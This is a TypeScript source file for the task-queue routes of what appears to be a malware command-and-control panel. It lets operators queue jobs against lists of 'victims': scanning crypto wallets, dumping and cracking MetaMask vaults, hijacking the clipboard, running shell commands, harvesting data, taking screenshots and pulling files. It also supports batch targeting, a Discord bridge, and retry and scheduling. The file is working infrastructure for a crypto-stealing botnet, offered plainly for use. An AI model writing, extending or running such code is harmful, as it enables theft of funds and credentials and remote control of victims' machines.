import type { FastifyPluginAsync } from 'fastify';
import { z } from 'zod';
import { prisma } from '../lib/db';
import { audit } from '../lib/audit';
import { bad, HttpError, notFound } from '../lib/errors';
import { bridgeStatus } from '../services/discord-bridge';
import { requireRole } from '../plugins/auth';
import { publish } from '../lib/bus';

const TASK_NAMES = ['scan_wallets', 'dump_vault', 'crack_vault', 'clip_start', 'clip_stop', 'shell', 'harvest', 'screenshot', 'file_pull', 'cancel'] as const;

const enqueueSchema = z.object({
  victim_ids: z.array(z.string().uuid()).min(1).max(500),
  name: z.enum([...TASK_NAMES] as [string, ...string[]]),
  params: z.record(z.unknown()).default({}),
  priority: z.number().int().min(-10).max(10).default(0),
  timeout_sec: z.number().int().min(1).max(3600).default(120),
  not_before: z.string().datetime().optional()
});

const templates = [
  { name: 'scan_wallets', label: 'Scan wallets', params: {}, timeout_sec: 120 },
  { name: 'dump_vault', label: 'Dump vault', params: { target: 'metamask' }, timeout_sec: 300 },
  { name: 'crack_vault', label: 'Crack vault', params: { target: 'metamask', max_seconds: 90 }, timeout_sec: 180 },
  { name: 'clip_start', label: 'Start clipboard', params: { replace: false }, timeout_sec: 30 },
  { name: 'clip_stop', label: 'Stop clipboard', params: {}, timeout_sec: 30 },
  { name: 'screenshot', label: 'Screenshot', params: {}, timeout_sec: 60 },
  { name: 'harvest', label: 'Harvest', params: {}, timeout_sec: 180 },
  { name: 'shell', label: 'Shell', params: { command: 'whoami' }, timeout_sec: 60 }
];

export const taskRoutes: FastifyPluginAsync = async (app) => {
  app.get('/tasks/templates', async () => ({ items: templates }));

  app.get('/tasks', async (request) => {
    const query = z
      .object({
        status: z.enum(['queued', 'running', 'done', 'error', 'cancelled', 'expired']).optional(),
        victim: z.string().uuid().optional(),
        name: z.string().max(64).optional(),
        q: z.string().max(128).optional(),
        limit: z.coerce.number().int().min(1).max(200).default(50)
      })
      .parse(request.query);
    const items = await prisma.task.findMany({
      where: {
        ...(query.status ? { status: query.status } : {}),
        ...(query.victim ? { victimId: query.victim } : {}),
        ...(query.name ? { name: query.name } : {}),
        ...(query.q ? { OR: [{ victim: { hostname: { contains: query.q, mode: 'insensitive' } } }, { error: { contains: query.q, mode: 'insensitive' } }] } : {})
      },
      orderBy: [{ createdAt: 'desc' }],
      take: query.limit,
      include: { victim: { select: { id: true, hostname: true, os: true } }, createdBy: { select: { email: true } } }
    });
    return { items };
  });

  app.post('/tasks', { preHandler: requireRole('operator') }, async (request, reply) => {
    const input = enqueueSchema.parse(request.body);
    const victims = await prisma.victim.findMany({
      where: { id: { in: input.victim_ids }, revokedAt: null },
      select: { id: true, hostname: true, discord: { select: { channelId: true, missingAt: true } } }
    });
    if (victims.length === 0) throw bad('no_victims', 'no live victim in selection');
    if (bridgeStatus().enabled) {
      const unlinked = victims.filter((victim) => !victim.discord);
      if (unlinked.length > 0) {
        throw new HttpError(
          422,
          'discord_unlinked',
          `no Discord link: ${unlinked.map((victim) => victim.hostname).join(', ')}`,
          0,
          { victim_ids: unlinked.map((victim) => victim.id) }
        );
      }
    }
    const notBefore = input.not_before ? new Date(input.not_before) : new Date();
    const created = await prisma.$transaction(
      victims.map((victim) =>
        prisma.task.create({
          data: {
            victimId: victim.id,
            name: input.name,
            params: input.params as never,
            priority: input.priority,
            timeoutSec: input.timeout_sec,
            notBefore,
            createdById: request.operator!.id
          }
        })
      )
    );
    await audit(prisma, {
      operatorId: request.operator?.id,
      action: 'task.enqueue',
      entity: 'task',
      ip: request.clientIp,
      data: { name: input.name, victims: victims.map((v) => v.id), params: input.params }
    });
    void publish({ type: 'task.update', at: Date.now(), data: { queued: created.length, name: input.name } });
    return reply.code(201).send({ items: created.map((task) => ({ id: task.id, victimId: task.victimId })) });
  });

  app.post('/tasks/:id/cancel', { preHandler: requireRole('operator') }, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const task = await prisma.task.findUnique({ where: { id } });
    if (!task) throw notFound('task');
    if (!['queued', 'running'].includes(task.status)) throw bad('finished', 'task already finished');
    await prisma.task.update({ where: { id }, data: { status: 'cancelled', finishedAt: new Date(), leaseUntil: null } });
    await prisma.task.create({ data: { victimId: task.victimId, name: 'cancel', params: { task_id: task.id } as never, priority: 10, timeoutSec: 30, createdById: request.operator!.id } });
    await audit(prisma, { operatorId: request.operator?.id, action: 'task.cancel', entity: 'task', entityId: id, ip: request.clientIp });
    void publish({ type: 'task.update', victimId: task.victimId, at: Date.now(), data: { id, status: 'cancelled' } });
    return { ok: true };
  });

  app.post('/tasks/:id/retry', { preHandler: requireRole('operator') }, async (request, reply) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const task = await prisma.task.findUnique({ where: { id } });
    if (!task) throw notFound('task');
    const copy = await prisma.task.create({
      data: {
        victimId: task.victimId,
        name: task.name,
        params: task.params as never,
        priority: task.priority,
        timeoutSec: task.timeoutSec,
        createdById: request.operator!.id
      }
    });
    await audit(prisma, { operatorId: request.operator?.id, action: 'task.retry', entity: 'task', entityId: id, ip: request.clientIp, data: { copy: copy.id } });
    return reply.code(201).send({ id: copy.id });
  });

  app.post('/tasks/:id/reschedule', { preHandler: requireRole('operator') }, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const { not_before } = z.object({ not_before: z.string().datetime() }).parse(request.body);
    await prisma.task.update({ where: { id }, data: { notBefore: new Date(not_before), status: 'queued' } });
    await audit(prisma, { operatorId: request.operator?.id, action: 'task.reschedule', entity: 'task', entityId: id, ip: request.clientIp, data: { not_before } });
    return { ok: true };
  });

  app.delete('/tasks/:id', { preHandler: requireRole('admin') }, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    await prisma.task.delete({ where: { id } });
    await audit(prisma, { operatorId: request.operator?.id, action: 'task.delete', entity: 'task', entityId: id, ip: request.clientIp });
    return { ok: true };
  });
};
